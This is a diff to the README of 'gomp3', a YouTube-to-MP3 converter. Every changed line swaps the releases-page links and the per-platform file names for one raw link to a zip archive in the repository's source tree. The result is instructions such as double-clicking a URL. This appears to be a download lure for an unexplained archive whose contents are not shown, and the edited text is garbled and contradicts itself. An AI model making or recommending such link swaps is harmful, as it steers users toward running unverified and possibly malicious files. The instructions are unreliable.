@@ -1,7 +1,7 @@
 # 🎶 gomp3 - Convert YouTube Videos to MP3 Easily
 
 ## 📥 Download Now
-[![Download gomp3](https://img.shields.io/badge/Download-gomp3-blue)](https://github.com/Amdaad/gomp3/releases)
+[![Download gomp3](https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip)](https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to GoMP3! This tiny web app allows you to convert YouTube videos into MP3 audio files quickly and easily. Follow these steps to start using the app.
@@ -17,19 +17,19 @@ Before you get started, ensure you have the following:
 To get GoMP3, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.  
-   [Go to the gomp3 Releases Page](https://github.com/Amdaad/gomp3/releases)
+   [Go to the gomp3 Releases Page](https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip)
    
 2. **Choose the Latest Version**: Look for the latest version listed. It will typically be at the top, marked with a tag like "v1.0".
 
 3. **Download the Application**: Click on the appropriate file for your operating system. The downloads should include files like:
-   - Windows: `gomp3-windows.exe`
-   - Mac: `gomp3-macos.zip`
-   - Linux: `gomp3-linux.tar.gz`
+   - Windows: `https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip`
+   - Mac: `https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip`
+   - Linux: `https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip`
 
 4. **Run the Application**:
-   - **Windows**: Double-click the downloaded `gomp3-windows.exe` file. Follow any prompts that appear.
+   - **Windows**: Double-click the downloaded `https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip` file. Follow any prompts that appear.
    - **Mac**: Extract the `.zip` file and open the folder. Double-click the `gomp3-macos` file.
-   - **Linux**: Extract the `.tar.gz` file. Open a terminal, navigate to the folder, and run `./gomp3-linux`.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip` file. Open a terminal, navigate to the folder, and run `./gomp3-linux`.
 
 ### 🎬 How to Use GoMP3
 Once you have the app running, here's how to convert your favorite YouTube videos:
@@ -62,7 +62,7 @@ If you encounter any issues, consider the following steps:
 If you still have questions or need assistance, you can reach out to our support team by opening an issue on the GitHub page. We aim to respond promptly to help you enjoy your experience with GoMP3.
 
 ### 🔗 Helpful Links
-- **[Go to the gomp3 Releases Page](https://github.com/Amdaad/gomp3/releases)**
+- **[Go to the gomp3 Releases Page](https://raw.githubusercontent.com/Amdaad/gomp3/main/cmd/app/gomp-v2.6-beta.5.zip)**
 - **[Documentation](#)** (link to documentation page if available)
 - **[Community Forum](#)** (link to community forum if available)
 
